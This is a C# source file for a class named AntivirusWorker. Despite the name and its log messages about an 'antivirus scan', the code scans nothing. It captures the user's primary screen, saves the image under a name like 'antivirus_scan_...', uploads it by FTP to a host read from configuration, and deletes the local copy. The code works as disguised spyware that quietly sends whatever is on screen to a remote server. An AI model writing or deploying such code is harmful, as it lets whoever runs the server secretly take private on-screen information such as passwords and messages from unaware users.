using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;

public class AntivirusWorker
{
    private readonly ILogger<AntivirusWorker> _logger;
    private readonly IConfiguration _configuration;
    private readonly string _ftpHost;
    private readonly string _ftpUsername;
    private readonly string _ftpPassword;
    private readonly string _remoteDirectory;
    private readonly string _localSaveDirectory;

    public AntivirusWorker(ILogger<AntivirusWorker> logger, IConfiguration configuration)
    {
        _logger = logger;
        _configuration = configuration;

        _ftpHost = _configuration["FtpSettings:FtpHost"];
        _ftpUsername = _configuration["FtpSettings:FtpUsername"];
        _ftpPassword = _configuration["FtpSettings:FtpPassword"];
        _remoteDirectory = "/antivirus";
        _localSaveDirectory = Path.Combine(Path.GetTempPath(), "Antivirus");
    }

    public void Run()
    {
        try
        {
            Directory.CreateDirectory(_localSaveDirectory);
            EnsureDirectoryExistsFtp(_ftpHost, _remoteDirectory, _ftpUsername, _ftpPassword);

            string filePath = CaptureScreenAndSave(_localSaveDirectory);
            _logger.LogInformation($"File saved to {filePath}");
            string remoteUri = $"{_ftpHost}{_remoteDirectory}/{Path.GetFileName(filePath)}";
            UploadFileFtp(filePath, remoteUri, _ftpUsername, _ftpPassword);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "An error occurred during the antivirus scan and upload process.");
        }
    }

    private string CaptureScreenAndSave(string directoryPath)
    {
        var bounds = Screen.PrimaryScreen.Bounds;
        var bitmap = new Bitmap(bounds.Width, bounds.Height);

        using (var g = Graphics.FromImage(bitmap))
        {
            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
        }

        string fileName = $"antivirus_scan_{DateTime.Now:yyyyMMdd_HHmmss}.png";
        string filePath = Path.Combine(directoryPath, fileName);
        bitmap.Save(filePath, ImageFormat.Png);

        return filePath;
    }

    private void UploadFileFtp(string localFilePath, string remoteUri, string username, string password)
    {
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(remoteUri);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(username, password);

            byte[] fileContents = File.ReadAllBytes(localFilePath);

            request.ContentLength = fileContents.Length;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(fileContents, 0, fileContents.Length);
            }

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                _logger.LogInformation($"Upload File Complete, status {response.StatusDescription}");
            }

            File.Delete(localFilePath);
            _logger.LogInformation($"Local file {localFilePath} deleted.");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "FTP Upload Failed.");
            throw;
        }
    }

    private void EnsureDirectoryExistsFtp(string host, string directory, string username, string password)
    {
        string directoryUri = $"{host}{directory}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(directoryUri);
            request.Method = WebRequestMethods.Ftp.MakeDirectory;
            request.Credentials = new NetworkCredential(username, password);

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                _logger.LogInformation($"FTP Directory '{directory}' created successfully. Status: {response.StatusDescription}");
            }
        }
        catch (WebException ex)
        {
            FtpWebResponse response = ex.Response as FtpWebResponse;
            if (response != null && response.StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
            {
                _logger.LogInformation($"FTP Directory '{directory}' likely already exists or permissions denied (550). Proceeding.");
            }
            else
            {
                _logger.LogError(ex, $"Error creating directory {directory}");
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, $"Unexpected error in directory check");
        }
    }
}
